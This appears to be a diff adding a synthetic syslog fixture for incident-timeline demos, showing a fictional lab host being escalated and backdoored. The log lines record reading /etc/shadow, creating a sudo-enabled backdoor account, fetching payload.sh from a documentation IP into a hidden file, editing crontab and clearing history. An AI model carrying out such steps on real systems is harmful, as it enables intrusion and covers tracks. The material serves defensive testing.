@@ -1,0 +1,23 @@
+# =====================================================================================
+# SYNTHETIC TEST DATA - post-login privilege escalation & persistence by webadmin (2026-10-28)
+# Generated for PS-013 Incident Timeline demos. NOT real security events.
+# Hosts (lab-*) are fictional; IPs are RFC 5737 documentation ranges
+# (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24). Syslog timestamps: import with year 2026.
+# =====================================================================================
+Oct 28 14:10:02 lab-web01 sudo: webadmin : 2 incorrect password attempts ; TTY=pts/1 ; PWD=/home/webadmin ; USER=root ; COMMAND=/bin/bash
+Oct 28 14:10:40 lab-web01 sudo: webadmin : TTY=pts/1 ; PWD=/home/webadmin ; USER=root ; COMMAND=/usr/bin/id
+Oct 28 14:11:05 lab-web01 sudo: webadmin : TTY=pts/1 ; PWD=/home/webadmin ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Oct 28 14:12:10 lab-web01 sudo: webadmin : TTY=pts/1 ; PWD=/home/webadmin ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc-backup
+Oct 28 14:12:10 lab-web01 useradd[2401]: new group: name=svc-backup, GID=1006
+Oct 28 14:12:10 lab-web01 useradd[2401]: new user: name=svc-backup, UID=1006, GID=1006, home=/home/svc-backup, shell=/bin/bash, from=/dev/pts/1
+Oct 28 14:12:30 lab-web01 sudo: webadmin : TTY=pts/1 ; PWD=/home/webadmin ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc-backup
+Oct 28 14:12:30 lab-web01 usermod[2405]: add 'svc-backup' to group 'sudo'
+Oct 28 14:12:30 lab-web01 usermod[2405]: add 'svc-backup' to shadow group 'sudo'
+Oct 28 14:12:51 lab-web01 passwd[2409]: pam_unix(passwd:chauthtok): password changed for svc-backup
+Oct 28 14:13:05 lab-web01 sudo: webadmin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.23/payload.sh -O /tmp/.cache.sh
+Oct 28 14:13:40 lab-web01 sudo: webadmin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab -e
+Oct 28 14:14:20 lab-web01 su[2420]: FAILED SU (to root) webadmin on pts/1
+Oct 28 14:20:33 lab-web01 sshd[2460]: Accepted password for svc-backup from 203.0.113.45 port 53390 ssh2
+Oct 28 14:20:33 lab-web01 sshd[2460]: pam_unix(sshd:session): session opened for user svc-backup(uid=1006) by (uid=0)
+Oct 28 14:21:02 lab-web01 sudo: svc-backup : TTY=pts/2 ; PWD=/home/svc-backup ; USER=root ; COMMAND=/usr/bin/history -c
+Oct 28 14:24:47 lab-web01 sshd[2460]: Disconnected from user svc-backup 203.0.113.45 port 53390
